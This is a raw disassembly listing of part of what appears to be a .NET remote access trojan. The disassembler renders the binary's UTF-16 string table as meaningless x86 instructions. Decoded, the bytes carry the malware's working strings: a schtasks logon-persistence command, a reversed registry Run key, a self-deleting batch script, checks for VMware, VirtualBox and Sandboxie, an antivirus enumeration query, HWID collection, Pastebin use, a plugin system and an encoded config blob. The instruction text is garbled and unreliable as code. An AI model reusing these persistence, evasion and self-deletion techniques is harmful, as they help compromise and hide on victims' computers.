  40b6ec:	00 62 00             	add    %ah,0x0(%edx)
  40b6ef:	6f                   	outsl  %ds:(%esi),(%dx)
  40b6f0:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40b6f4:	00 7a 00             	add    %bh,0x0(%edx)
  40b6f7:	46                   	inc    %esi
  40b6f8:	00 5a 00             	add    %bl,0x0(%edx)
  40b6fb:	32 00                	xor    (%eax),%al
  40b6fd:	2f                   	das
  40b6fe:	00 65 00             	add    %ah,0x0(%ebp)
  40b701:	4c                   	dec    %esp
  40b702:	00 68 00             	add    %ch,0x0(%eax)
  40b705:	61                   	popa
  40b706:	00 4b 00             	add    %cl,0x0(%ebx)
  40b709:	6d                   	insl   (%dx),%es:(%edi)
  40b70a:	00 59 00             	add    %bl,0x0(%ecx)
  40b70d:	50                   	push   %eax
  40b70e:	00 63 00             	add    %ah,0x0(%ebx)
  40b711:	61                   	popa
  40b712:	00 6d 00             	add    %ch,0x0(%ebp)
  40b715:	4d                   	dec    %ebp
  40b716:	00 7a 00             	add    %bh,0x0(%edx)
  40b719:	6a 00                	push   $0x0
  40b71b:	5a                   	pop    %edx
  40b71c:	00 44 00 4b          	add    %al,0x4b(%eax,%eax,1)
  40b720:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  40b724:	00 77 00             	add    %dh,0x0(%edi)
  40b727:	50                   	push   %eax
  40b728:	00 70 00             	add    %dh,0x0(%eax)
  40b72b:	4d                   	dec    %ebp
  40b72c:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  40b730:	00 39                	add    %bh,(%ecx)
  40b732:	00 37                	add    %dh,(%edi)
  40b734:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b737:	4e                   	dec    %esi
  40b738:	00 51 00             	add    %dl,0x0(%ecx)
  40b73b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b740:	09 6e 00             	or     %ebp,0x0(%esi)
  40b743:	75 00                	jne    0x40b745
  40b745:	6c                   	insb   (%dx),%es:(%edi)
  40b746:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b74a:	01 00                	add    %eax,(%eax)
  40b74c:	03 3a                	add    (%edx),%edi
  40b74e:	00 00                	add    %al,(%eax)
  40b750:	0d 50 00 61 00       	or     $0x610050,%eax
  40b755:	63 00                	arpl   %eax,(%eax)
  40b757:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b75a:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b75e:	09 50 00             	or     %edx,0x0(%eax)
  40b761:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b767:	00 0f                	add    %cl,(%edi)
  40b769:	4d                   	dec    %ebp
  40b76a:	00 65 00             	add    %ah,0x0(%ebp)
  40b76d:	73 00                	jae    0x40b76f
  40b76f:	73 00                	jae    0x40b771
  40b771:	61                   	popa
  40b772:	00 67 00             	add    %ah,0x0(%edi)
  40b775:	65 00 00             	add    %al,%gs:(%eax)
  40b778:	07                   	pop    %es
  40b779:	63 00                	arpl   %eax,(%eax)
  40b77b:	6d                   	insl   (%dx),%es:(%edi)
  40b77c:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b780:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b786:	00 73 00             	add    %dh,0x0(%ebx)
  40b789:	63 00                	arpl   %eax,(%eax)
  40b78b:	68 00 74 00 61       	push   $0x61007400
  40b790:	00 73 00             	add    %dh,0x0(%ebx)
  40b793:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b796:	00 20                	add    %ah,(%eax)
  40b798:	00 2f                	add    %ch,(%edi)
  40b79a:	00 63 00             	add    %ah,0x0(%ebx)
  40b79d:	72 00                	jb     0x40b79f
  40b79f:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b7a3:	74 00                	je     0x40b7a5
  40b7a5:	65 00 20             	add    %ah,%gs:(%eax)
  40b7a8:	00 2f                	add    %ch,(%edi)
  40b7aa:	00 66 00             	add    %ah,0x0(%esi)
  40b7ad:	20 00                	and    %al,(%eax)
  40b7af:	2f                   	das
  40b7b0:	00 73 00             	add    %dh,0x0(%ebx)
  40b7b3:	63 00                	arpl   %eax,(%eax)
  40b7b5:	20 00                	and    %al,(%eax)
  40b7b7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b7b8:	00 6e 00             	add    %ch,0x0(%esi)
  40b7bb:	6c                   	insb   (%dx),%es:(%edi)
  40b7bc:	00 6f 00             	add    %ch,0x0(%edi)
  40b7bf:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b7c3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b7c4:	00 20                	add    %ah,(%eax)
  40b7c6:	00 2f                	add    %ch,(%edi)
  40b7c8:	00 72 00             	add    %dh,0x0(%edx)
  40b7cb:	6c                   	insb   (%dx),%es:(%edi)
  40b7cc:	00 20                	add    %ah,(%eax)
  40b7ce:	00 68 00             	add    %ch,0x0(%eax)
  40b7d1:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b7d7:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b7db:	74 00                	je     0x40b7dd
  40b7dd:	20 00                	and    %al,(%eax)
  40b7df:	2f                   	das
  40b7e0:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b7e4:	00 20                	add    %ah,(%eax)
  40b7e6:	00 22                	add    %ah,(%edx)
  40b7e8:	00 00                	add    %al,(%eax)
  40b7ea:	11 22                	adc    %esp,(%edx)
  40b7ec:	00 20                	add    %ah,(%eax)
  40b7ee:	00 2f                	add    %ch,(%edi)
  40b7f0:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b7f4:	00 20                	add    %ah,(%eax)
  40b7f6:	00 27                	add    %ah,(%edi)
  40b7f8:	00 22                	add    %ah,(%edx)
  40b7fa:	00 01                	add    %al,(%ecx)
  40b7fc:	13 22                	adc    (%edx),%esp
  40b7fe:	00 27                	add    %ah,(%edi)
  40b800:	00 20                	add    %ah,(%eax)
  40b802:	00 26                	add    %ah,(%esi)
  40b804:	00 20                	add    %ah,(%eax)
  40b806:	00 65 00             	add    %ah,0x0(%ebp)
  40b809:	78 00                	js     0x40b80b
  40b80b:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b811:	5c                   	pop    %esp
  40b812:	00 6e 00             	add    %ch,0x0(%esi)
  40b815:	75 00                	jne    0x40b817
  40b817:	52                   	push   %edx
  40b818:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b81c:	00 6f 00             	add    %ch,0x0(%edi)
  40b81f:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b825:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b829:	74 00                	je     0x40b82b
  40b82b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b82c:	00 65 00             	add    %ah,0x0(%ebp)
  40b82f:	72 00                	jb     0x40b831
  40b831:	72 00                	jb     0x40b833
  40b833:	75 00                	jne    0x40b835
  40b835:	43                   	inc    %ebx
  40b836:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b83a:	00 77 00             	add    %dh,0x0(%edi)
  40b83d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b83e:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b842:	00 69 00             	add    %ch,0x0(%ecx)
  40b845:	57                   	push   %edi
  40b846:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b84a:	00 66 00             	add    %ah,0x0(%esi)
  40b84d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b84e:	00 73 00             	add    %dh,0x0(%ebx)
  40b851:	6f                   	outsl  %ds:(%esi),(%dx)
  40b852:	00 72 00             	add    %dh,0x0(%edx)
  40b855:	63 00                	arpl   %eax,(%eax)
  40b857:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b85d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b861:	61                   	popa
  40b862:	00 77 00             	add    %dh,0x0(%edi)
  40b865:	74 00                	je     0x40b867
  40b867:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b86b:	53                   	push   %ebx
  40b86c:	00 00                	add    %al,(%eax)
  40b86e:	03 22                	add    (%edx),%esp
  40b870:	00 00                	add    %al,(%eax)
  40b872:	09 2e                	or     %ebp,(%esi)
  40b874:	00 62 00             	add    %ah,0x0(%edx)
  40b877:	61                   	popa
  40b878:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b87c:	13 40 00             	adc    0x0(%eax),%eax
  40b87f:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b883:	68 00 6f 00 20       	push   $0x20006f00
  40b888:	00 6f 00             	add    %ch,0x0(%edi)
  40b88b:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b88f:	00 1f                	add    %bl,(%edi)
  40b891:	74 00                	je     0x40b893
  40b893:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b899:	6f                   	outsl  %ds:(%esi),(%dx)
  40b89a:	00 75 00             	add    %dh,0x0(%ebp)
  40b89d:	74 00                	je     0x40b89f
  40b89f:	20 00                	and    %al,(%eax)
  40b8a1:	33 00                	xor    (%eax),%eax
  40b8a3:	20 00                	and    %al,(%eax)
  40b8a5:	3e 00 20             	add    %ah,%ds:(%eax)
  40b8a8:	00 4e 00             	add    %cl,0x0(%esi)
  40b8ab:	55                   	push   %ebp
  40b8ac:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b8b0:	15 53 00 54 00       	adc    $0x540053,%eax
  40b8b5:	41                   	inc    %ecx
  40b8b6:	00 52 00             	add    %dl,0x0(%edx)
  40b8b9:	54                   	push   %esp
  40b8ba:	00 20                	add    %ah,(%eax)
  40b8bc:	00 22                	add    %ah,(%edx)
  40b8be:	00 22                	add    %ah,(%edx)
  40b8c0:	00 20                	add    %ah,(%eax)
  40b8c2:	00 22                	add    %ah,(%edx)
  40b8c4:	00 00                	add    %al,(%eax)
  40b8c6:	07                   	pop    %es
  40b8c7:	43                   	inc    %ebx
  40b8c8:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b8cc:	00 00                	add    %al,(%eax)
  40b8ce:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b8d2:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b8d6:	00 22                	add    %ah,(%edx)
  40b8d8:	00 00                	add    %al,(%eax)
  40b8da:	0f 22 00             	mov    %eax,%cr0
  40b8dd:	20 00                	and    %al,(%eax)
  40b8df:	2f                   	das
  40b8e0:	00 66 00             	add    %ah,0x0(%esi)
  40b8e3:	20 00                	and    %al,(%eax)
  40b8e5:	2f                   	das
  40b8e6:	00 71 00             	add    %dh,0x0(%ecx)
  40b8e9:	00 05 78 00 70 00    	add    %al,0x700078
  40b8ef:	00 45 53             	add    %al,0x53(%ebp)
  40b8f2:	00 65 00             	add    %ah,0x0(%ebp)
  40b8f5:	6c                   	insb   (%dx),%es:(%edi)
  40b8f6:	00 65 00             	add    %ah,0x0(%ebp)
  40b8f9:	63 00                	arpl   %eax,(%eax)
  40b8fb:	74 00                	je     0x40b8fd
  40b8fd:	20 00                	and    %al,(%eax)
  40b8ff:	2a 00                	sub    (%eax),%al
  40b901:	20 00                	and    %al,(%eax)
  40b903:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b907:	6f                   	outsl  %ds:(%esi),(%dx)
  40b908:	00 6d 00             	add    %ch,0x0(%ebp)
  40b90b:	20 00                	and    %al,(%eax)
  40b90d:	57                   	push   %edi
  40b90e:	00 69 00             	add    %ch,0x0(%ecx)
  40b911:	6e                   	outsb  %ds:(%esi),(%dx)
  40b912:	00 33                	add    %dh,(%ebx)
  40b914:	00 32                	add    %dh,(%edx)
  40b916:	00 5f 00             	add    %bl,0x0(%edi)
  40b919:	43                   	inc    %ebx
  40b91a:	00 6f 00             	add    %ch,0x0(%edi)
  40b91d:	6d                   	insl   (%dx),%es:(%edi)
  40b91e:	00 70 00             	add    %dh,0x0(%eax)
  40b921:	75 00                	jne    0x40b923
  40b923:	74 00                	je     0x40b925
  40b925:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b929:	53                   	push   %ebx
  40b92a:	00 79 00             	add    %bh,0x0(%ecx)
  40b92d:	73 00                	jae    0x40b92f
  40b92f:	74 00                	je     0x40b931
  40b931:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b935:	00 19                	add    %bl,(%ecx)
  40b937:	4d                   	dec    %ebp
  40b938:	00 61 00             	add    %ah,0x0(%ecx)
  40b93b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b93c:	00 75 00             	add    %dh,0x0(%ebp)
  40b93f:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b943:	63 00                	arpl   %eax,(%eax)
  40b945:	74 00                	je     0x40b947
  40b947:	75 00                	jne    0x40b949
  40b949:	72 00                	jb     0x40b94b
  40b94b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b94f:	00 2b                	add    %ch,(%ebx)
  40b951:	6d                   	insl   (%dx),%es:(%edi)
  40b952:	00 69 00             	add    %ch,0x0(%ecx)
  40b955:	63 00                	arpl   %eax,(%eax)
  40b957:	72 00                	jb     0x40b959
  40b959:	6f                   	outsl  %ds:(%esi),(%dx)
  40b95a:	00 73 00             	add    %dh,0x0(%ebx)
  40b95d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b95e:	00 66 00             	add    %ah,0x0(%esi)
  40b961:	74 00                	je     0x40b963
  40b963:	20 00                	and    %al,(%eax)
  40b965:	63 00                	arpl   %eax,(%eax)
  40b967:	6f                   	outsl  %ds:(%esi),(%dx)
  40b968:	00 72 00             	add    %dh,0x0(%edx)
  40b96b:	70 00                	jo     0x40b96d
  40b96d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b96e:	00 72 00             	add    %dh,0x0(%edx)
  40b971:	61                   	popa
  40b972:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40b976:	00 6f 00             	add    %ch,0x0(%edi)
  40b979:	6e                   	outsb  %ds:(%esi),(%dx)
  40b97a:	00 00                	add    %al,(%eax)
  40b97c:	0b 4d 00             	or     0x0(%ebp),%ecx
  40b97f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b980:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b984:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b988:	0f 56 00             	orps   (%eax),%xmm0
  40b98b:	49                   	dec    %ecx
  40b98c:	00 52 00             	add    %dl,0x0(%edx)
  40b98f:	54                   	push   %esp
  40b990:	00 55 00             	add    %dl,0x0(%ebp)
  40b993:	41                   	inc    %ecx
  40b994:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b998:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40b99d:	77 00                	ja     0x40b99f
  40b99f:	61                   	popa
  40b9a0:	00 72 00             	add    %dh,0x0(%edx)
  40b9a3:	65 00 00             	add    %al,%gs:(%eax)
  40b9a6:	15 56 00 69 00       	adc    $0x690056,%eax
  40b9ab:	72 00                	jb     0x40b9ad
  40b9ad:	74 00                	je     0x40b9af
  40b9af:	75 00                	jne    0x40b9b1
  40b9b1:	61                   	popa
  40b9b2:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40b9b6:	00 6f 00             	add    %ch,0x0(%edi)
  40b9b9:	78 00                	js     0x40b9bb
  40b9bb:	00 17                	add    %dl,(%edi)
  40b9bd:	53                   	push   %ebx
  40b9be:	00 62 00             	add    %ah,0x0(%edx)
  40b9c1:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40b9c7:	6c                   	insb   (%dx),%es:(%edi)
  40b9c8:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40b9cc:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40b9d0:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b9d4:	11 45 00             	adc    %eax,0x0(%ebp)
  40b9d7:	72 00                	jb     0x40b9d9
  40b9d9:	72 00                	jb     0x40b9db
  40b9db:	20 00                	and    %al,(%eax)
  40b9dd:	48                   	dec    %eax
  40b9de:	00 57 00             	add    %dl,0x0(%edi)
  40b9e1:	49                   	dec    %ecx
  40b9e2:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b9e6:	05 78 00 32 00       	add    $0x320078,%eax
  40b9eb:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40b9f1:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40b9f7:	74 00                	je     0x40b9f9
  40b9f9:	49                   	dec    %ecx
  40b9fa:	00 6e 00             	add    %ch,0x0(%esi)
  40b9fd:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40ba01:	00 09                	add    %cl,(%ecx)
  40ba03:	48                   	dec    %eax
  40ba04:	00 57 00             	add    %dl,0x0(%edi)
  40ba07:	49                   	dec    %ecx
  40ba08:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ba0c:	09 55 00             	or     %edx,0x0(%ebp)
  40ba0f:	73 00                	jae    0x40ba11
  40ba11:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba15:	00 05 4f 00 53 00    	add    %al,0x53004f
  40ba1b:	00 13                	add    %dl,(%ebx)
  40ba1d:	4d                   	dec    %ebp
  40ba1e:	00 69 00             	add    %ch,0x0(%ecx)
  40ba21:	63 00                	arpl   %eax,(%eax)
  40ba23:	72 00                	jb     0x40ba25
  40ba25:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba26:	00 73 00             	add    %dh,0x0(%ebx)
  40ba29:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba2a:	00 66 00             	add    %ah,0x0(%esi)
  40ba2d:	74 00                	je     0x40ba2f
  40ba2f:	00 03                	add    %al,(%ebx)
  40ba31:	20 00                	and    %al,(%eax)
  40ba33:	00 09                	add    %cl,(%ecx)
  40ba35:	54                   	push   %esp
  40ba36:	00 72 00             	add    %dh,0x0(%edx)
  40ba39:	75 00                	jne    0x40ba3b
  40ba3b:	65 00 00             	add    %al,%gs:(%eax)
  40ba3e:	0b 36                	or     (%esi),%esi
  40ba40:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ba43:	62 00                	bound  %eax,(%eax)
  40ba45:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40ba4b:	46                   	inc    %esi
  40ba4c:	00 61 00             	add    %ah,0x0(%ecx)
  40ba4f:	6c                   	insb   (%dx),%es:(%edi)
  40ba50:	00 73 00             	add    %dh,0x0(%ebx)
  40ba53:	65 00 00             	add    %al,%gs:(%eax)
  40ba56:	0b 33                	or     (%ebx),%esi
  40ba58:	00 32                	add    %dh,(%edx)
  40ba5a:	00 62 00             	add    %ah,0x0(%edx)
  40ba5d:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40ba63:	50                   	push   %eax
  40ba64:	00 61 00             	add    %ah,0x0(%ecx)
  40ba67:	74 00                	je     0x40ba69
  40ba69:	68 00 00 0f 56       	push   $0x560f0000
  40ba6e:	00 65 00             	add    %ah,0x0(%ebp)
  40ba71:	72 00                	jb     0x40ba73
  40ba73:	73 00                	jae    0x40ba75
  40ba75:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba7b:	00 0b                	add    %cl,(%ebx)
  40ba7d:	41                   	inc    %ecx
  40ba7e:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40ba82:	00 69 00             	add    %ch,0x0(%ecx)
  40ba85:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba86:	00 00                	add    %al,(%eax)
  40ba88:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40ba8c:	00 75 00             	add    %dh,0x0(%ebp)
  40ba8f:	65 00 00             	add    %al,%gs:(%eax)
  40ba92:	0b 66 00             	or     0x0(%esi),%esp
  40ba95:	61                   	popa
  40ba96:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40ba9a:	00 65 00             	add    %ah,0x0(%ebp)
  40ba9d:	00 17                	add    %dl,(%edi)
  40ba9f:	50                   	push   %eax
  40baa0:	00 65 00             	add    %ah,0x0(%ebp)
  40baa3:	72 00                	jb     0x40baa5
  40baa5:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40baa9:	72 00                	jb     0x40baab
  40baab:	6d                   	insl   (%dx),%es:(%edi)
  40baac:	00 61 00             	add    %ah,0x0(%ecx)
  40baaf:	6e                   	outsb  %ds:(%esi),(%dx)
  40bab0:	00 63 00             	add    %ah,0x0(%ebx)
  40bab3:	65 00 00             	add    %al,%gs:(%eax)
  40bab6:	11 50 00             	adc    %edx,0x0(%eax)
  40bab9:	61                   	popa
  40baba:	00 73 00             	add    %dh,0x0(%ebx)
  40babd:	74 00                	je     0x40babf
  40babf:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bac3:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40bac9:	41                   	inc    %ecx
  40baca:	00 6e 00             	add    %ch,0x0(%esi)
  40bacd:	74 00                	je     0x40bacf
  40bacf:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bad5:	72 00                	jb     0x40bad7
  40bad7:	75 00                	jne    0x40bad9
  40bad9:	73 00                	jae    0x40badb
  40badb:	00 13                	add    %dl,(%ebx)
  40badd:	49                   	dec    %ecx
  40bade:	00 6e 00             	add    %ch,0x0(%esi)
  40bae1:	73 00                	jae    0x40bae3
  40bae3:	74 00                	je     0x40bae5
  40bae5:	61                   	popa
  40bae6:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40baea:	00 65 00             	add    %ah,0x0(%ebp)
  40baed:	64 00 00             	add    %al,%fs:(%eax)
  40baf0:	09 50 00             	or     %edx,0x0(%eax)
  40baf3:	6f                   	outsl  %ds:(%esi),(%dx)
  40baf4:	00 6e 00             	add    %ch,0x0(%esi)
  40baf7:	67 00 00             	add    %al,(%bx,%si)
  40bafa:	0b 47 00             	or     0x0(%edi),%eax
  40bafd:	72 00                	jb     0x40baff
  40baff:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb00:	00 75 00             	add    %dh,0x0(%ebp)
  40bb03:	70 00                	jo     0x40bb05
  40bb05:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bb0b:	00 2b                	add    %ch,(%ebx)
  40bb0d:	5c                   	pop    %esp
  40bb0e:	00 72 00             	add    %dh,0x0(%edx)
  40bb11:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb12:	00 6f 00             	add    %ch,0x0(%edi)
  40bb15:	74 00                	je     0x40bb17
  40bb17:	5c                   	pop    %esp
  40bb18:	00 53 00             	add    %dl,0x0(%ebx)
  40bb1b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bb1f:	75 00                	jne    0x40bb21
  40bb21:	72 00                	jb     0x40bb23
  40bb23:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bb29:	43                   	inc    %ebx
  40bb2a:	00 65 00             	add    %ah,0x0(%ebp)
  40bb2d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb2e:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bb32:	00 72 00             	add    %dh,0x0(%edx)
  40bb35:	32 00                	xor    (%eax),%al
  40bb37:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bb3d:	6c                   	insb   (%dx),%es:(%edi)
  40bb3e:	00 65 00             	add    %ah,0x0(%ebp)
  40bb41:	63 00                	arpl   %eax,(%eax)
  40bb43:	74 00                	je     0x40bb45
  40bb45:	20 00                	and    %al,(%eax)
  40bb47:	2a 00                	sub    (%eax),%al
  40bb49:	20 00                	and    %al,(%eax)
  40bb4b:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bb4f:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb50:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb53:	20 00                	and    %al,(%eax)
  40bb55:	41                   	inc    %ecx
  40bb56:	00 6e 00             	add    %ch,0x0(%esi)
  40bb59:	74 00                	je     0x40bb5b
  40bb5b:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb61:	72 00                	jb     0x40bb63
  40bb63:	75 00                	jne    0x40bb65
  40bb65:	73 00                	jae    0x40bb67
  40bb67:	50                   	push   %eax
  40bb68:	00 72 00             	add    %dh,0x0(%edx)
  40bb6b:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb6c:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bb70:	00 63 00             	add    %ah,0x0(%ebx)
  40bb73:	74 00                	je     0x40bb75
  40bb75:	00 17                	add    %dl,(%edi)
  40bb77:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bb7b:	73 00                	jae    0x40bb7d
  40bb7d:	70 00                	jo     0x40bb7f
  40bb7f:	6c                   	insb   (%dx),%es:(%edi)
  40bb80:	00 61 00             	add    %ah,0x0(%ecx)
  40bb83:	79 00                	jns    0x40bb85
  40bb85:	4e                   	dec    %esi
  40bb86:	00 61 00             	add    %ah,0x0(%ecx)
  40bb89:	6d                   	insl   (%dx),%es:(%edi)
  40bb8a:	00 65 00             	add    %ah,0x0(%ebp)
  40bb8d:	00 07                	add    %al,(%edi)
  40bb8f:	4e                   	dec    %esi
  40bb90:	00 2f                	add    %ch,(%edi)
  40bb92:	00 41 00             	add    %al,0x0(%ecx)
  40bb95:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bb9b:	00 13                	add    %dl,(%ebx)
  40bb9d:	53                   	push   %ebx
  40bb9e:	00 6f 00             	add    %ch,0x0(%edi)
  40bba1:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  40bba6:	00 61 00             	add    %ah,0x0(%ecx)
  40bba9:	72 00                	jb     0x40bbab
  40bbab:	65 00 5c 00 00       	add    %bl,%gs:0x0(%eax,%eax,1)
  40bbb0:	09 70 00             	or     %esi,0x0(%eax)
  40bbb3:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbb4:	00 6e 00             	add    %ch,0x0(%esi)
  40bbb7:	67 00 00             	add    %al,(%bx,%si)
  40bbba:	0d 70 00 6c 00       	or     $0x6c0070,%eax
  40bbbf:	75 00                	jne    0x40bbc1
  40bbc1:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbc5:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbc6:	00 00                	add    %al,(%eax)
  40bbc8:	15 73 00 61 00       	adc    $0x610073,%eax
  40bbcd:	76 00                	jbe    0x40bbcf
  40bbcf:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40bbd3:	6c                   	insb   (%dx),%es:(%edi)
  40bbd4:	00 75 00             	add    %dh,0x0(%ebp)
  40bbd7:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  40bbdb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbdc:	00 00                	add    %al,(%eax)
  40bbde:	07                   	pop    %es
  40bbdf:	44                   	inc    %esp
  40bbe0:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbe4:	00 00                	add    %al,(%eax)
  40bbe6:	15 73 00 65 00       	adc    $0x650073,%eax
  40bbeb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbec:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40bbf0:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bbf4:	00 67 00             	add    %ah,0x0(%edi)
  40bbf7:	69 00 6e 00 00 0d    	imul   $0xd00006e,(%eax),%eax
  40bbfd:	48                   	dec    %eax
  40bbfe:	00 61 00             	add    %ah,0x0(%ecx)
  40bc01:	73 00                	jae    0x40bc03
  40bc03:	68 00 65 00 73       	push   $0x73006500
  40bc08:	00 00                	add    %al,(%eax)
  40bc0a:	09 48 00             	or     %ecx,0x0(%eax)
  40bc0d:	61                   	popa
  40bc0e:	00 73 00             	add    %dh,0x0(%ebx)
  40bc11:	68 00 00 1b 50       	push   $0x501b0000
  40bc16:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc1a:	00 67 00             	add    %ah,0x0(%edi)
  40bc1d:	69 00 6e 00 2e 00    	imul   $0x2e006e,(%eax),%eax
  40bc23:	50                   	push   %eax
  40bc24:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bc28:	00 67 00             	add    %ah,0x0(%edi)
  40bc2b:	69 00 6e 00 00 07    	imul   $0x700006e,(%eax),%eax
  40bc31:	52                   	push   %edx
  40bc32:	00 75 00             	add    %dh,0x0(%ebp)
  40bc35:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc36:	00 00                	add    %al,(%eax)
  40bc38:	0f 4d 00             	cmovge (%eax),%eax
  40bc3b:	73 00                	jae    0x40bc3d
  40bc3d:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40bc41:	61                   	popa
  40bc42:	00 63 00             	add    %ah,0x0(%ebx)
  40bc45:	6b 00 00             	imul   $0x0,(%eax),%eax
  40bc48:	11 52 00             	adc    %edx,0x0(%edx)
  40bc4b:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bc4f:	65 00 69 00          	add    %ch,%gs:0x0(%ecx)
  40bc53:	76 00                	jbe    0x40bc55
  40bc55:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  40bc5a:	0b 45 00             	or     0x0(%ebp),%eax
  40bc5d:	72 00                	jb     0x40bc5f
  40bc5f:	72 00                	jb     0x40bc61
  40bc61:	6f                   	outsl  %ds:(%esi),(%dx)
